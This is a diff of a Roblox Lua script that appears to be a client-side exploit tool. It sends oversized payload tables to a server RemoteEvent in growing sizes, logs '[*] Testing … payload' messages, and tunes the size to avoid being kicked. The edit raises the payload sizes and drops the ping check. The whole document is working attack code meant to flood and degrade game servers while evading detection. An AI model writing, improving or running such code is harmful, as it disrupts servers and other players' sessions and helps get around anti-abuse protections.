@@ -7,7 +7,7 @@ local Stats = game:GetService("Stats")
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
--- ═══════════ OPTIMIZED CORE ═══════════
+-- ═══════════ CORE LOGIC ═══════════
 local SRC = [==[
 local RunService = game:GetService("RunService")
 local Stats = game:GetService("Stats")
@@ -412,42 +412,32 @@ local function processCommand(input)
             
             if api and api.stats()[2] > 0 then api.stop() end
             
-            -- Smaller sizes to guarantee it finishes quickly
-            local testSizes = {25000, 50000, 100000, 150000}
-            local bestSize = 25000
+            local testSizes = {50000, 100000, 150000, 200000}
+            local bestSize = 50000
             
             for _, size in ipairs(testSizes) do
-                log("[*] Building " .. size .. " payload...", Color3.fromRGB(200, 200, 200))
+                log("[*] Testing " .. size .. " payload...", Color3.fromRGB(200, 200, 200))
+                
+                -- Build safely with yields
                 local payload = {}
-                -- Yield so client doesn't freeze
                 for j = 1, size do 
                     payload[j] = {j, j*2}
                     if j % 5000 == 0 then task.wait() end 
                 end
                 
-                log("[*] Firing " .. size .. " for 2 seconds...", Color3.fromRGB(200, 200, 200))
-                local startTime = tick()
-                local pBefore = 0
-                pcall(function() pBefore = Stats.Network.ServerStatsItem["Data Ping"]:GetValue() end)
-                
-                -- Fire 5 times
-                for i = 1, 5 do
+                local startTime = os.clock()
+                for i = 1, 3 do
                     pcall(function() remote:FireServer(payload) end)
                     task.wait(0.1)
                 end
+                local endTime = os.clock()
                 
-                task.wait(1.5) -- Let ping update
-                local pAfter = 0
-                pcall(function() pAfter = Stats.Network.ServerStatsItem["Data Ping"]:GetValue() end)
-                local endTime = tick()
-                
-                -- If it took more than 3 seconds total (real time) to yield/fire, the client choked.
-                if (endTime - startTime) > 3.0 then
-                    log("[!] Client choked on " .. size .. "! Aborting.", Color3.fromRGB(255, 50, 50))
+                if (endTime - startTime) > 1.5 then
+                    log("[!] Client choked on " .. size .. ". Aborting before kick.", Color3.fromRGB(255, 50, 50))
                     break
                 end
                 
-                log(string.format("[*] Size %d tested. Ping: %dms", size, math.floor(pAfter)), Color3.fromRGB(200, 200, 200))
+                log("[*] Size " .. size .. " successful. Client handled it fine.", Color3.fromRGB(200, 200, 200))
                 bestSize = size
                 task.wait(1)
             end
